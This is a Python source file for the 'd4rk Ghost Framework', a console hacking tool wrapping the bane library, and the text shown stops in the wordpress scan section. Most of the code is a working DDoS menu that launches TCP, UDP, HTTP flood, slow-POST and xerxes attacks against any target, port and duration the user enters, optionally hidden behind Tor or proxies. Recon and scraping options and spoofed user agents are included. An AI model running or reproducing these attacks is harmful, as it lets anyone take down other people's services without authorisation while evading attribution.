#!/bin/python3

#----------------------------------------------------------------------#
# Bane module Credit Goes to - ala,s0u1
#
# 
#----------------------------------------------------------------------#
# d4rk ghost framework version 2.1







from colorama import Fore,Style
import os
import time
import sys
import random
 






r = Fore.RED
b = Fore.BLUE
g = Fore.GREEN	
y = Fore.YELLOW
w = Fore.WHITE
m = Fore.MAGENTA
c = Fore.CYAN
reset = Style.RESET_ALL



try:
	import bane 

except:
	print(r , "[!] Bane module Not installed ")
	print(g , "[+] Installing Bane module For you ")	
	os.system("pip3 install bane")
	print(g , "[+] Bane module sucessfully Installed ")
	print(reset)
	sys.exit()


print("\n")
sys.stdout.write(b + "\r[*] Loading d4rk Ghost Framework ... ")
time.sleep(0.5)

sys.stdout.write(b + "\r[*] Loading d4rk Ghost Framework [-] ")
time.sleep(0.5)

sys.stdout.write(b + "\r[*] Loading d4rk Ghost Framework [|] ")
time.sleep(0.5)

sys.stdout.write(b + "\r[*] Loading d4rk Ghost Framework [/] ")
time.sleep(0.5)

sys.stdout.write(b + "\r[*] Loading d4rk Ghost Framework [-] ")
time.sleep(0.5)

sys.stdout.write(b + "\r[*] Loading d4rk Ghost Framework [\\] ")
time.sleep(0.5)

sys.stdout.write(b + "\r[*] Loading d4rk Ghost Framework [|] ")
time.sleep(0.5)

sys.stdout.write(b + "\r[*] Loading d4rk Ghost Framework [/] ")
time.sleep(0.5)
sys.stdout.write(b  + "\r[*] Loading d4rk Ghost Framework [-] ")
time.sleep(0.5)




def banner():
	os.system("clear || cls ")
	print(r , """

██████╗ ██╗  ██╗██████╗ ██╗  ██╗     ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
██╔══██╗██║  ██║██╔══██╗██║ ██╔╝    ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
██║  ██║███████║██████╔╝█████╔╝     ██║  ███╗███████║██║   ██║███████╗   ██║   
██║  ██║╚════██║██╔══██╗██╔═██╗     ██║   ██║██╔══██║██║   ██║╚════██║   ██║   
██████╔╝     ██║██║  ██║██║  ██╗    ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   
╚═════╝      ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝                                                      
                                                                      """ + c + "Version 2.0" 


          + b + '\n\t\t"All in one hacking Red team pentesting Framework"' + c +  "\n" +  "-" * 90 + r + "\n\t\t[!]" + w + " Type help or ? command in the console" )



               

def modules():
	print(b + "[+] Modules Name  " + r + "\t[+] Usage of Module ")
	print(m + "-" * 10 + "\t" + "-" * 50)
	print(w + "[+] To use a particular modules type - use [module_name] in console to use it . ")
	print(b + "1) auxiliary  " + r + "\tInformation Gathering and recon modules")
	print(b + "2) ddos  " + r + "\tAll ddos attack methods available ")
	print(b + "3) exploitation" + r + "\tAll explotation modules , vulnerablity Testing modules")
	print(b + "4) proxies  " + r + "\tproxy scraper module http/socks4/socks5")
	print(b + "5) wordpresscan" + r + "\tscanning wordpress website for vulnerablity")




def help():
	print(b + "[+] Commands Name " + r + "\t[+] Command Usage" )
	print(c + "-" * 10 + "\t" +  "-" *  50)
	print(b + "1) modules   " + w + "\tType modules Command to Show the list of available modules")
	print(b + "2) show   " + w + "\tType show command in prompt to show lists of items inside the module ")
	print(b + "3) use  " + w  + "\tType use command in prompt to use any module Eg. use [module_name] ")
	print(b  + "4) back " + w  + "\tType back command to go back to main menu This will take back one module back")
	print(b   + "5) clear   " + w  + "\tType clear command to clear the console")
	print(b  + "6) exit  " + w   + "\tType exit command to exit the framework")
	print(b + "7) banner   " + w  + "\tType banner command in the console to show banner of the tool ")
	print(b   + "8) cls  " +  w   + "\tType cls command in console to clear the screen")
	print(b  + "9) quit  " + w  + "\tType quit command in the console to exit the framework ")
	print(b  + "10) help  " + w  + "\tType help command in the console to show help menu ")
	print(b  + "11) ?   " + w  + "\tType ? command in the console to show help menu")
	print(b  + "12) author   " + w  + "\tType author command to print information of author of this tool & bane module ")
	print(b  + "13) version   " + w   + "\tType version command in the console to show the current version of the framework")
	print(b  + "14) update  " + w  + "\tType update command in console to update python  bane module to the latest version")
	

def ddos():
	print(b + "[+] Ddos Methods List " + y + "\t[+] Usage")
	print(w + "-" * 10 + "\t" + "-" * 50)
	print(b + "1) normal_tcp "  + w  + "\t\tType normal_tcp Command in prompt To do tcpflood dos attack" )
	print(b + "2) tor_tcp " + w  + "\t\tType tor_tcp Command in Prompt To do tcpflood dos attack \n\t\t\tThe Traffic will go through tor netowrk This cannot be used in windows")
	print(b + "3) normal_udp " + w  + "\t\tType normal_udp command in console to do udp flood dos attack")
	print(b + "4) httpflood  " + w + "\t\tType httpflood command in prompt to do normal httpflood attack ")
	print(b + "5) tor_httpflood  " + w + "\tType tor_httpflood command to do http dos attack using tor\n\t\t\tThe traffic will go through tor Not for Windows")
	print(b + "6) proxyhttpflood " + w + "\t\tType proxyhttpflod command in console to do http flood ddds attack using proxies ")
	print(b + "7) torshammer " + w  + "\t\tType torshammer command in console to do slow http post attack using tor Not for windows")
	print(b + "8) proxyhammer " + w  + "\t\tType proxyhammer command in console to do slow http post attack using proxy instead of tor")
	print(b + "9) tor_xerxes " + w + "\t\tType tor_xerxes command in console to do xerxes attack using tor Not for windows")
	print(b + "10) proxy_xerxes"  + w + "\tType proxy_xerxes command in console to do xerxes attacking using proxies")
	print(b + "11) normal_xerxes" + w + "\tType normal_xerxes Command to do normal xerxes without tor or proxies")


def auxiliary():
	print(b + "[+] Information Gathering " + y + "\t[+] Usage")
	print(b + "-" * 10 + "\t" + "-" * 50)
	print(m + "1) whois " + b + "\tType info command in console to get information about domain or ip")
	print(m + "2) crawl " + b  + "\tType crawl command in console to crawl the website and get all links on page" )
	print(m + "3) myip " + b  + "\tType myip command in console to find your public ip addresses")
	print(m + "4) google_dorks " + b  + "\tType google_dorks command in console for google dorking for searching " )
	print(m + "5) website_header " + b  + "\tType website_header Command in console to find information about website headers")
	print(m + "6) reverse_ip " + b  + "\tType reverse_ip command in console to do reverse ip lookup ")
	print(m + "7) anticrawl " + b  + "\tType the anticrawl command in the console to bypass the anticrawlers in webpage " )
	print(m + "8) webpage_forms" + b  + "\tType webpage_forms command in the console to get all page forms and their value ")
	print(m + "9) media " + b  + "\tType media command in console to get all social media links and external link of web page")

def wordpress():
	print(b + "[+] Wordpress scaning" + w + "\t[+] Usage")
	print(m + "-" * 90)
	print(m + "1) wpscan : " + w + "Type wpscan command in console to do scanning  vulnerablity for wordpress website " )


def proxy():
	print(b + "[+] Proxy Scraper" + w + "\t[+] Usage")
	print(m + "-" * 10 + "\t" + "-" * 50)
	print(m + "1) httproxy" + w + "\tType httproxy command in console to scrape http proxies ")
	print(m + "2) socks4" + w + "\tType socks4 command in the console to scrape socks4 proxies ")
	print(m + "3) socks5" + w + "\tType socks5 command in console to scrap socks5 proxies ")


def exploit():
	print(b + "[+] Commands " + w + "\t[+] Usage")
	print(w + "-" * 10 + "\t" + "-" * 50)
	print(b + "1) xsscan  " + w + "\t\tType xsscan command in console to do xss vulnerablity scanning ")
	print(b + "2) sqlscan_mysql"  + w + "\tType sqlscan_mysql command in console to do sql injection vulnerablity scanning for website running\n\t\t\tmysql in backend ")
	print(b  + "3) sqlscan_orcale " + w + "\tType sqlscan_orcale command in console to do sql injection vulnerablity scanning for website running\n\t\t\torcale in backend")
	print(b  + "4) sqlscan_postgre " + w + "\tType sqlscan_postgre command in console to do sql injection vulnerablity scanning for website running\n\t\t\tpostgresql in backend")
	print(b  + "5) sqlscan_sqlserver " + w + "\tType sqlscan_sqlserver command in console to do sql injection vulnerablity scanning for website running\n\t\t\tsql server in backded ")
	print(b  + "6) clickjacking " + w +  "\tType clickjacking command in console to do clickjacking vulnerablity scanning")


def author():
	print(c + "About author of the d4rk Ghost framework and developer of bane module ")
	print(m + "#" + c + "=" * 80 + m + "#")
	print(r + "\t\t[+] Author of d4rk ghost framework")
	print(r + "1) d4rk sh4d0w: " + c + " programmer and hacker " )
	print(m + "#" + c + "=" * 80 + m + "#")
	print(r + "\t\t[+] Author of python bane module")
	print(r  + "1) ala bouali: " + c  + "python/php developer security researcher and god father of bane module ")
	print(r + "2) s0u1: " + c + " programmer and hacker ")


def version():
	print(w + "[+]" + c + " d4rk Ghost Framework Version : " + r + "2.1")


def update_bane():
	print(w + "Wait Updating bane module .. ")
	os.system("pip3 uninstall bane ")
	time.sleep(4)
	print(c + "Fetching Bane module Latest version ... ")
	os.system("pip3 install bane")
	print(b + "[+]" + "Bane module updated to the latest version ")









	






	

my_girlfriend = []
my_girlfriend.append("Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)")
my_girlfriend.append("Mozilla/4.0 (compatible; MSIE 5.5; AOL 5.0; Windows 98; YComp 5.0.0.0)")
my_girlfriend.append("Mozilla/4.0 (compatible; MSIE 5.5; AOL 5.0; Windows 98; Win 9x 4.90)")
my_girlfriend.append("Mozilla/5.0 (X11; U; UNICOS lcLinux; en-US) Gecko/20140730 (KHTML, like Gecko, Safari/419.3) Arora/0.8.0")
my_girlfriend.append("Mozilla/5.0 (X11; U; Linux; de-DE) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3)  Arora/0.4")
my_girlfriend.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Arora/0.10.2 Safari/534.34")
my_girlfriend.append("Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.6) Gecko/20070731 BonEcho/2.0.0.6")
my_girlfriend.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1.3pre) Gecko/20070301 BonEcho/2.0.0.3pre")
my_girlfriend.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.2) Gecko/20070302 BonEcho/2.0.0.2")
my_girlfriend.append("Mozilla/5.0 (BeOS; U; Haiku BePC; en-US; rv:1.8.1.14) Gecko/20080429 BonEcho/2.0.0.14")
my_girlfriend.append("Mozilla/5.0 (X11; U; Linux mips; en-US; rv:1.8.1.1) Gecko/20070628 BonEcho/2.0.0.1")
my_girlfriend.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.9 (KHTML, like Gecko) AppleWebKit/418.9 Cheshire/1.0.ALPHA")
my_girlfriend.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA")
my_girlfriend.append('Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/125) Cheshire/1.0.ALPHA')
my_girlfriend.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36")


banner()

print("\n")


while True:
	try:
		prompt = input(Fore.YELLOW  + "(d4rk_Ghost)" + Fore.CYAN +  " > ")

	except KeyboardInterrupt:

		print("\nInterrupt: " + r + "Type exit or quit command to exit the console ")

		continue


	if prompt.strip().lower() == "exit" or prompt.strip().lower() == "quit":
		sys.exit()


	if prompt.strip().lower() == "modules":
		modules()
		print("\n")
		continue

	
	if prompt.strip().lower() == "help" or prompt.strip().lower() == "?":
		help()
		print("\n")
		continue

	if prompt.strip().lower() == "clear" or prompt.strip().lower() == "cls":
		os.system("clear || cls")
		continue

	if prompt.strip().lower() == "banner":
		banner()
		print("\n")
		continue

	if prompt.strip().lower() == "author":
		author()
		print("\n")
		continue


	if prompt.strip().lower() == "version":
		version()
		continue



	if prompt.strip().lower() == "update":
		update_bane()
		continue



	



	
		







# ala and s0u1 here i have not added that keyboardfunction because when ddos attack will start then if user want to stop attack then he can type ctrl +c to quit and stop 


	if prompt.strip().lower() == "use ddos":
		while True:
			prompt2 = input(Fore.BLUE + "(d4rk_Ghost)" + Fore.RED + "[ddos]"  + Fore.CYAN +  " > ")


			if prompt2.strip().lower() == "show":
				ddos()
				print("\n")
				continue

			if prompt2.strip().lower() == "clear" or prompt2.strip().lower() == "cls":
				os.system("clear || cls")
				
				continue

			if prompt2.strip().lower() == "back":
				break
				
			if prompt2.strip().lower() == "exit" or prompt2.strip().lower() == "quit":
				
				sys.exit()

			if prompt2.strip().lower() == "help" or prompt2.strip().lower() == "?":
				help()
				print("\n")
				continue

			if prompt2.strip().lower() == "banner":
				banner()
				print("\n")
				continue

				

			if prompt2.strip().lower() == "author":
				author()
				print("\n")
				continue

			if prompt2.strip().lower() == "modules":
				modules()
				print("\n")
				continue



			if prompt2.strip().lower() == "version":
				version()
				print("\n")
				continue


			if prompt2.strip().lower() == "update":
				update_bane()
				continue		



			if prompt2.strip().lower() == "normal_tcp":
				try:
					target = str(input(b + "[IP/Website:~] # "))

				except KeyboardInterrupt:
					print("\n")
					continue

				if target == "":
					print(c + "[!] Dont leave target field blank")
					continue

				else:
					pass
				try:
					port = input(b + "[Port:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if port == "":
					print(c + " [!] Dont leave port field blank")
					continue

				else:
					pass

					
				try:
					time = input(b + "[Duration:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if time == "":
					print(c + " [!] Dont leave time  field blank")
					continue

				else:
					pass

				try:
					threading = input(b + "[Threads:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue


				if threading == "":
					print(c + " [!] Dont leave threading field blank")
					continue


				else:
					pass	
				sys.stdout.write(c + "[+] Attack Started target => {} \n ".format(target))
				bane.tcp_flood(target, p=int(port), min_size=10, max_size=20, interval=0.001, threads=int(threading), timeout=5, duration=int(time), logs=True)

			if prompt2.strip().lower() == "tor_tcp":
				try:
					target = str(input(b + "[IP/Website:~] # "))

				except KeyboardInterrupt:
					print("\n")
					continue	
				if target == "":
					print(c + "[!] Dont leave target field blank")
					continue

				else:
					pass
				try:
					port = input(b + "[Port:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if port == "":
					print(c + "[!] Dont leave port field blank")
					continue
				else:
					pass

				try:
					time = input(b + "[Duration:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if time == "":
					print(c + "[!] Dont leave time field blank")
					continue

				else:
					pass

				try:
					threading = input(b + "[Threads:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if threading == "":
					print(c + "[!] Dont leave threading field blank")
					continue

				else:
					pass	
				try:

					os.system("service tor start")

				except:
					print(r + "[-] tor service not installed\n . install tor using command sudo apt install tor -y")
					break
				sys.stdout.write(r + "[+] Tor service Started Let the attack go through tor network\n")
				sys.stdout.write(c + "[+] Attack Started target => {} \n ".format(target))
				bane.tcp_flood(target, p=int(port), min_size=10, max_size=20, interval=0.001, threads=int(threading), timeout=5, duration=int(time), logs=True, tor=True)

			if prompt2.strip().lower() == "normal_udp":
				try:
					target = str(input(b + "[IP/Website:~] # "))

				except KeyboardInterrupt:
					print("\n")
					continue

				if target == "":
					print(c + "[!] Dont leave target field blank")
					continue

				else:
					pass

				try:
					port = input(b + "[Port:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue


				if port == "":
					print(c + "[!] Dont leave port field blank")
					continue

				else:
					pass

				try:
					time = input(b + "[Duration:~] # ")


				except KeyboardInterrupt:
					print("\n")
					continue


				if time == "":
					print(c + "[!] Dont leave time field blank")
					continue

				else:
					pass	
				sys.stdout.write(c + "[+] Attack Started target => {} \n ".format(target))
				bane.udp_flood(target, p=int(port), min_size=10, max_size=20, interval=0.001, duration=int(time),  logs=True)

			
			

			if prompt2.strip().lower() == "httpflood":
				try:
					target = str(input(b + "[IP/Website:~] # "))

				except KeyboardInterrupt:
					print("\n")
					continue

				if target == "":
					print(c + "[!] Dont leave target field blank")
					continue

				else:
					pass

				try:
					port = input(b + "[Port:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if port == "":
					print(c + "[!] Dont leave port field blank")
					continue

				else:
					pass
				try:
					time = input(b + "[Duration:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if time == "":
					print(c + "[!] Dont leave time field blank")
					continue

				else:
					pass

				try:
					threading = input(b + "[Threads:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue


				if threading == "":
					print(c + "[!] Dont leave threading field blank")
					continue

				else:
					pass	
				sys.stdout.write(c + "[+] Attack Started target => {} \n ".format(target))
				bane.http_spam(target, p=port, interval=0.001, threads=threading, timeout=5, duration=time, logs=True)

			if prompt2.strip().lower() == "tor_httpflood":
				try:
					target = str(input(b + "[IP/Website:~] # "))

				except KeyboardInterrupt:
					print("\n")
					continue

				if target == "":
					print(c + "[!] Dont leave target field blank")
					continue

				else:
					pass
				try:
					port = input(b + "[Port:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if port == "":
					print(c + "[!] Dont leave port field blank")
					continue

				else:
					pass

				try:
					time = input(b + "[Duration:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue


				if time == "":
					print(c + "[!] Dont leave time field blank")
					continue

				else:
					pass

				try:
					threading = input(b + "[Threads:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if threading == "":
					print(c + "[!] Dont leave threading field blank")
					continue

				else:
					pass	
				
				try:
					os.system("service tor start")

				except:
					print(r + "[-] tor service not installed\n . install tor using command sudo apt install tor -y")
					break

				sys.stdout.write(r + "[+] Tor service Started Let the attack go through tor network\n")	
				sys.stdout.write(c + "[+] Attack Started target => {} \n ".format(target))
				bane.http_spam(target, p=port, interval=0.001, threads=threading, timeout=5, duration=time, logs=True, tor=True)


			
			if prompt2.strip().lower() == "proxyhttpflood":
				try:
					target = str(input(b + "[IP/Website:~] # "))

				except KeyboardInterrupt:
					print("\n")
					continue



				if target == "":
					print(c + "[!] Dont leave target field blank")
					continue

				else:
					pass

				try:
					port = input(b + "[Port:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if port == "":
					print(c + "[!] Dont leave port  field blank")
					continue

				else:
					pass	
				try:
					time = input(b + "[Duration:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if time == "":
					print(c + "[!] Dont leave time field blank")
					continue

				else:
					pass
				try:
					threading = input(b + "[Threads:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if threading == "":
					print(c + "[!] Dont leave threading field blank")
					continue

				else:
					pass	
				sys.stdout.write(c + "[+] Attack Started target => {} \n ".format(target))
				bane.prox_http_spam(target, p=port, interval=0.001, threads=threading, timeout=5, duration=time, logs=True)



			if prompt2.strip().lower() == "torshammer":
				try:
					target = str(input(b + "[IP/Website:~] # "))

				except KeyboardInterrupt:
					print("\n")
					continue

						
				if target == "":
					print(c + "[!] Dont leave target field blank")
					continue

				else:
					pass

				try:
					port = input(b + "[Port:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if port == "":
					print(c + "[!] Dont leave port  field blank")
					continue

				else:
					pass
				try:
					time = input(b + "[Duration:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue


				if time == "":
					print(c + "[!] Dont leave time field blank")
					continue

				else:
					pass
				try:
					threading = input(b + "[Threads:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if threading == "":
					print(c + "[!] Dont leave threading field blank")
					continue

				else:
					pass	
				try:
					os.system("service tor start")

				except:
					print(r + "[-] tor service not installed\n . install tor using command sudo apt install tor -y")
					break

				sys.stdout.write(r + "[+] Tor service Started Let the attack go through tor network\n")
				sys.stdout.write(c + "[+] Attack Started target => {} \n ".format(target))
				bane.torshammer(target, p=port, duration=time,  threads=threading, timeout=5, logs=True, tor=True)


			
			if prompt2.strip().lower() == "proxyhammer":
				try:
					target = str(input(b + "[IP/Website:~] # "))

				except KeyboardInterrupt:
					print("\n")
					continue

				if target == "":
					print(c + "[!] Dont leave target field blank")
					continue

				else:
					pass 

				try:
					port = input(b + "[Port:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue	

				if port == "":
					print(c + "[!] Dont leave port field blank")
					continue

				else:
					pass 
				try:
					time = input(b + "[Duration:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue


				if time == "":
					print(c + "[!] Dont leave time field blank") 
					continue

				else:
					pass

				try:
					threading = input(b + "[Threads:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue


				if threading == "":
					print(c + "[!] Dont leave threading field blank")
					continue


				else:
					pass	
				sys.stdout.write(c + "[+] Attack Started target => {} \n ".format(target))
				bane.prox_hammer(target, p=port, duration=time, threads=threading, timeout=5, logs=True)



			if prompt2.strip().lower() == "tor_xerxes":
				try:
					target = str(input(b + "[IP/Website:~] # "))

				except KeyboardInterrupt:
					print("\n")
					continue

				if target == "":
					print(c + "[!] Dont leave target field blank")
					continue

				else:
					pass  
				try:
					port = input(b + "[Port:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if port == "":
					print(c + "[!] Dont leave port field blank")
					continue


				else:
					pass	


				try:
					time = input(b + "[Duration:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue


				if time == "":
					print(c + "[!] Dont leave time  field blank")
					continue

				else:
					pass

				try:
					threading = input(b + "[Threads:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if threading == "":
					print(c + "[!] Dont leave Threads field blank")
					continue

				else:
					pass 	
				try:
					os.system("service tor start")

				except:
					print(r + "[-] tor service not installed\n . install tor using command sudo apt install tor -y")
					break

				sys.stdout.write(r + "[+] Tor service Started Let the attack go through tor network\n")	
				sys.stdout.write(c + "[+] Attack Started target => {} \n ".format(target))
				bane.xerxes(target, p= port, duration=time, tor=True, threads=threading, timeout=5, logs=True)

			if prompt2.strip().lower() == "proxy_xerxes":
				try:
					target = str(input(b + "[IP/Website:~] # "))

				except KeyboardInterrupt:
					print("\n")
					continue

				if target == "":
					print(c + "[!] Dont leave target field blank")
					continue

				else:
					pass 	

				try:
					port = input(b + "[Port:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue


				if port == "":
					print(c + "[!] Dont leave port  field blank")
					continue

				else:
					pass

				try:
					time = input(b + "[Duration:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue


				if time == "":
					print(c + "[!] Dont leave time field blank")
					continue

				else:
					pass

				try:
					threading = input(b + "[Threads:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue
						

				if threading == "":
					print(c + "[!] Dont leave thread field blank")
					continue

				else:
					pass 	
				sys.stdout.write(c + "[+] Attack Started target => {} \n ".format(target))
				bane.prox_xerxes(target, p=port, duration=time, threads=threading, timeout=5, logs=True)

			if prompt2.strip().lower() == "normal_xerxes":
				try:
					target = str(input(b + "[IP/Website:~] # "))

				except KeyboardInterrupt:
					print("\n")
					continue


				if target == "":
					print(c + "[!] Dont leave target field blank")
					continue


				else:
					pass

				try:
					port = input(b + "[Port:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if port == "":
					print(c + "[!] Dont leave port  field blank")
					continue

				else:
					pass

				try:
					time = input(b + "[Duration:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if time == "":
					print(c + "[!] Dont leave time field blank")
					continue

				else:
					pass

				try:
					threading = input(b + "[Threads:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue


				if threading == "":
					print(c + "[!] Dont leave thread field blank")
					continue

				else:
					pass 	

			
				sys.stdout.write(c + "[+] Attack Started target => {} \n ".format(target))
				bane.xerxes(target, p= port, duration=time,  threads=threading, timeout=5, logs=True)

			
			if prompt2.strip() == "":
				pass	

			else:
				print(r + "[-] " +  c + " Command not found Type show command to list items inside module")
				continue



	

	if prompt.strip().lower() == "use auxiliary":
		while True:
			try:
				prompt3 = input(Fore.BLUE + "(d4rk_Ghost)" + Fore.RED + "[auxiliary]" + Fore.CYAN + " > " )

			except KeyboardInterrupt:
				print("\nInterrupt: " + r + "Type exit or quit command to exit the console " )
				continue


			if prompt3.strip().lower() == "show":
				auxiliary()
				print("\n")
				continue

			if prompt3.strip().lower() == "clear" or prompt3.strip().lower() == "cls":
				os.system("clear || cls")
				
				continue

			if prompt3.strip().lower() == "back":
				break
				

			if prompt3.strip().lower() == "exit" or prompt3.strip().lower() == "quit":
				
				sys.exit()

			if prompt3.strip().lower() == "help" or prompt3.strip().lower() == "?":
				help()
				print("\n")
				continue

			if prompt3.strip().lower() == "banner":
				banner()
				print("\n")
				continue


			if prompt3.strip().lower() == "author":
				author()
				continue


			if prompt3.strip().lower() == "modules":
				modules()
				print("\n")
				continue


			if prompt3.strip().lower() == "version":
				version()
				print("\n")
				continue

			
			if prompt3.strip().lower() == "update":
				update_bane()
				continue





			if prompt3.strip().lower() == "myip":

				ip = bane.myip()
				print(c + "[+] Your Public Ip is : " , ip)
				continue


			if prompt3.strip().lower() == "whois":

				try:
					target = str(input(c + "[Ip/Domain:~] # "))

				except KeyboardInterrupt:
					print("\n")
					continue	

				if target == "":
					print(c + "[!] Dont leave target field blank")
					continue

				else:
					pass 	
				bane.info(target, timeout=15, logs=True, returning=False)

				


			if prompt3.strip().lower() == "google_dorks":
				try:
					dorking = input(c + "[Dork:~] # ")

				except KeyboardInterrupt:
					print("\n")
					continue

				if dorking == "":
					print(c + "[!] Dont leave dork field blank")
					continue

				else:
					pass 	

				sys.stdout.write(w + "[+] Finding dorks releated to {} \n ".format(dorking))
				result = bane.google_dorking(str(dorking))
				for x in result:
					print(b + "[+]", x)
					time.sleep(1)

			if prompt3.strip().lower() == "website_header":
				try:
					link = str(input(b + "[Website:~] # "))

				except KeyboardInterrupt:
					print("\n")
					continue

				if link == "":
					print(c + "[!] Dont leave target field blank")
					continue

				else:
					pass 

				sys.stdout.write(w + "[+] Finding header information for website : {} \n ".format(link))
				if link != "http://" or link != "https://":
					print( c + "[!] Please Enter Full path of website Example :  http://example.com")
					continue

				else:
					print(m + "-" * 70)
					print(c)
				
					sys.stdout.write(y + "[+] Website Header Information Found \n ")
					bane.headers(link)
					
			if prompt3.strip().lower() == "reverse_ip":
				try:
					domain = str(input(b + "[Ip:~] # "))

				except KeyboardInterrupt:
					print("\n")	
					continue

				if domain == "":
					print(c + "[!] Dont leave target field blank")
					continue


				else:
					pass 

				sys.stdout.write(w + "[+] Performing Reverse Ip Lookup \n ")
				a = bane.reverse_ip_lookup(domain, logs=True)
				print(a)
				
			
			if prompt3.strip().lower() == "crawl":
				target = str(input(c + "[Website:~] # "))

				if target == "":
					print(c + "[!] Dont leave target field blank")
					continue

				else:
					pass 	
				sys.stdout.write(w + "[+] Crawling the website to find all links on page \n")

				if "http://" in target or "https://" in target:


					print(c + "[+] Crawling Started")

					a = bane.crawl(target, timeout=10)
					for x,y in a.items():
						print(x,y)

				else:
					print(w + "plese enter full path http://example.com ")


			
			if prompt3.strip().lower() == "anticrawl":
				try:
					target = str(input(c + "[Website:~] # "))

				except KeyboardInterrupt:
					print("\n")
					continue

				if target == "":
					print(c + "[!] Dont leave target field blank")
					continue

				else:
					pass 

				sys.stdout.write(w + "[+] Bypassing anti-crawlers , Crawling the website to find all links on page \n")
				

				
				if "http://" in target or "https://" in target:


					print(c + "[+] Crawling Started")
					a = bane.crawl(target, timeout=10, bypass=True)
					for x in a.values():
						print(x)
				else:
					print(w + "pleae enter full path example http://example.com ")

			if prompt3.strip().lower() == "webpage_forms":
				try:
					target = str(input(w + "[Website:~] # "))

				except KeyboardInterrupt:
					print("\n")
					continue

				if target == "":
					print(c + "[!] Dont leave target field blank")
					continue

				else:
					pass 	
				 

				if "http://" in target or "https://" in target:

					print(c + "[+] Getting All page forms and their values ")
					a = bane.forms(target, value=True , timeout=10 )
					for x in a:
						print(x)
				else:
					print(w + "please enter full path http://example.com ")

			if prompt3.strip().lower() == "media":
				try:
					target = str(input(c + "[Website:~] # "))

				except KeyboardInterrupt:
					print("\n")
					continue

				if target == "":
					print(c + "[!] Dont leave target field blank")
					continue

				else:
					pass 	
				sys.stdout.write(c + "[+] Finding social media links and external link on webpage \n")
				
				
				if "http://" in target or "https://" in target:

					print(b + "[+] Links Founded ! ")
					print("-" * 90)
					a = bane.media(target, timeout=10 )
					for x in a.values():
						print("[+]" , x)

				else:
					print(w + "please enter full path example http://example.com ")

			if prompt3 == "":
				pass 

			else:
				print(r + "[-]" + c + " Command Not found Type show command to list items inside module ")


					


					
	if prompt.strip().lower() == "use wordpresscan":
		while True:
			try:
				prompt4 = input(Fore.BLUE + "(d4rk_Ghost)" + Fore.RED + "[wordpressscan]" + Fore.CYAN + " > ")

			except KeyboardInterrupt:
				print("\nInterrupt: " + r + "Type exit or quit command to exit the console ")
				continue

			if prompt4.strip().lower() == "show":
				wordpress()
				print("\n")
				continue		

			if prompt4.strip().lower() == "clear" or prompt4.strip().lower() == "cls":
				os.system("clear || cls")
				continue

			
			if prompt4.strip().lower() == "back":
				break
				
				

			if prompt4.strip().lower() == "exit" or prompt4.strip().lower() == "quit":
				sys.exit()

			if prompt4.strip().lower() == "help" or prompt4.strip().lower() == "?":
				help()
				print("\n")
				continue


			if prompt4.strip().lower() == "modules":
				modules()
				print("\n")
				continue

			if prompt4.strip().lower() == "version":
				version()
				continue


			if prompt4.strip().lower() == "author":
				author()
				continue

			
			if prompt4.strip().lower() == "banner":
				banner()
				print("\n")
				continue


			if prompt4.strip().lower() == "update":
				update_bane()
				continue


							
 
			if prompt4.strip().lower() == "wpscan":
				try:
					host = str(input(c + "[Website:~] # "))

					if host.strip().lower() == "":
						print(w + "[+] please dont leave the target field blank")
						continue


				except KeyboardInterrupt:
					print("\n")
					continue

				sys.stdout.write(b + "[+] Scanning wordpress website for vulnerablity\n" )
